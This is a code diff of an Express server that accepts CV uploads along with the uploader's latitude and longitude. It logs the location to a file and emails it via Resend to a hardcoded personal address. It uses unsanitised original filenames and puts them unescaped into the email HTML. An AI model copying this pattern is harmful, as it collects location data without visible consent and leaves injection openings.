@@ -1,65 +1,77 @@
-require('dotenv').config();
-const express = require('express');
-const multer = require('multer');
-const nodemailer = require('nodemailer');
-const fs = require('fs');
-const path = require('path');
-const cors = require('cors');
+// server.js
+import express from "express";
+import multer from "multer";
+import fs from "fs";
+import path from "path";
+import dotenv from "dotenv";
+import nodemailer from "nodemailer";
+import { Resend } from "resend";
+
+dotenv.config();
 
 const app = express();
-app.use(cors());
+const PORT = process.env.PORT || 10000;
+
+// Middleware
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.static("public"));
 
-app.use(express.static(path.join(__dirname, 'public')));
-
-const uploadDir = path.join(__dirname, 'uploads');
+// Ensure uploads folder exists
+const uploadDir = path.join(process.cwd(), "uploads");
 if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
 
+// Multer setup for local uploads
 const storage = multer.diskStorage({
-  destination: (req, file, cb) => cb(null, uploadDir),
-  filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
+  destination: (req, file, cb) => {
+    cb(null, "uploads/");
+  },
+  filename: (req, file, cb) => {
+    const uniqueName = `${Date.now()}-${file.originalname}`;
+    cb(null, uniqueName);
+  },
 });
 const upload = multer({ storage });
 
-const transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: { user: process.env.EMAIL, pass: process.env.PASS }
+// Initialize Resend API
+const resend = new Resend(process.env.RESEND_API_KEY);
+
+// Serve index.html
+app.get("/", (req, res) => {
+  res.sendFile(path.join(process.cwd(), "public", "index.html"));
 });
 
-app.post('/upload', upload.single('cv'), async (req, res) => {
+// Upload endpoint
+app.post("/upload", upload.single("cv"), async (req, res) => {
   try {
     const { latitude, longitude } = req.body;
-    console.log(`✅ CV uploaded: ${req.file.filename}`);
-    console.log(`📍 Location received: ${latitude}, ${longitude}`);
 
-    const mailOptions = {
-      from: process.env.EMAIL,
-      to: process.env.EMAIL_TO,
-      subject: '📄 New CV Uploaded with Location',
-      text: `✅ New CV uploaded: ${req.file.filename}
+    // Log location to location.log
+    const logEntry = `✅ CV uploaded: ${req.file.filename}\n📍 Location: ${latitude}, ${longitude}\n\n`;
+    fs.appendFileSync("location.log", logEntry);
 
-📍 Location Details:
-Latitude: ${latitude || 'Not available'}
-Longitude: ${longitude || 'Not available'}
-Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`,
-      attachments: [
-        { filename: req.file.originalname, path: req.file.path }
-      ]
-    };
+    console.log(logEntry);
 
-    await transporter.sendMail(mailOptions);
-    console.log('📧 Email sent successfully!');
-    res.send('✅ File uploaded and email sent with location!');
+    // Send Email via Resend API
+    await resend.emails.send({
+      from: "SOS Webhook <no-reply@soswebhook.com>",
+      to: "amitgorai114@gmail.com",
+      subject: "📍 New CV Uploaded with Location",
+      html: `
+        <h2>New CV Uploaded</h2>
+        <p><b>File:</b> ${req.file.filename}</p>
+        <p><b>Location:</b> ${latitude}, ${longitude}</p>
+        <p>Check local uploads folder for the CV.</p>
+      `,
+    });
+
+    console.log("📧 Email sent via Resend API successfully!");
+    res.status(200).send("CV uploaded and location logged successfully!");
   } catch (err) {
-    console.error('❌ Error:', err);
-    res.status(500).send('Error sending email');
+    console.error("❌ Error:", err);
+    res.status(500).send("Internal Server Error");
   }
 });
 
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+app.listen(PORT, () => {
+  console.log(`🚀 Server running on port ${PORT}`);
 });
-
-const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
